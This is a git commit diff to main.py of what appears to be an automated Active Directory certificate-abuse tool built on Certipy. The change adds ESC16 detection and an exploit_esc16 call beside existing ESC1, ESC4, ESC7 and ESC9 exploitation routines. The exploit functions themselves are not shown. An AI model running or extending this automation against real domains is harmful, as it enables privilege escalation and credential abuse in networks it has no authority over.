f17816d05aa64441dd2c4f439024392678b2b4d0
lineeralgebra <94987429+lineeralgebra@users.noreply.github.com>
2025-07-27 09:34:58 -0400

    Update main.py

--- main.py
+++ main.py
@@ -1,4 +1,8 @@
-from utils.certipy_runner import run_certipy_find, save_results_to_json, exploit_esc1, exploit_esc4, exploit_esc7, exploit_esc1_domain_computer, exploit_esc9
+from utils.certipy_runner import (
+    run_certipy_find, save_results_to_json, 
+    exploit_esc1, exploit_esc4, exploit_esc7, 
+    exploit_esc9, exploit_esc16, exploit_esc1_domain_computer
+)
 from utils.parser import parse_stdout_output
 import argparse
 import os
@@ -27,6 +31,7 @@ def main():
     esc1_templates = [t for t in parsed_data if t.get("vuln") == "ESC1"]
     esc4_templates = [t for t in parsed_data if t.get("vuln") == "ESC4"]
     esc9_templates = [t for t in parsed_data if t.get("vuln") == "ESC9"]
+    esc16_cas = [t for t in parsed_data if t.get("vuln") == "ESC16"]
     esc7_cas = [t for t in parsed_data if t.get("vuln") == "ESC7"]
 
     if esc1_templates:
@@ -73,6 +78,16 @@ def main():
             ca_name=template["ca_name"],
             template_name=template["template_name"]
         )
+    elif esc16_cas:
+        ca = esc16_cas[0]
+        print(f"[+] Detected ESC16 on CA: {ca['ca_name']}")
+        exploit_esc16(
+            username=args.username,
+            password=args.password,
+            domain=args.domain,
+            dc_ip=args.dc_ip,
+            ca_name=ca["ca_name"]
+        )
     elif esc7_cas:
         ca = esc7_cas[0]
         print(f"[+] Detected ESC7 on CA: {ca['ca_name']}")
@@ -84,7 +99,7 @@ def main():
             ca_name=ca["ca_name"]
         )
     else:
-        print("[!] No exploitable templates (ESC1, ESC4, ESC7, or ESC9) found.")
+        print("[!] No exploitable templates (ESC1, ESC4, ESC7, ESC9, or ESC16) found.")
 
 if __name__ == "__main__":
     main()
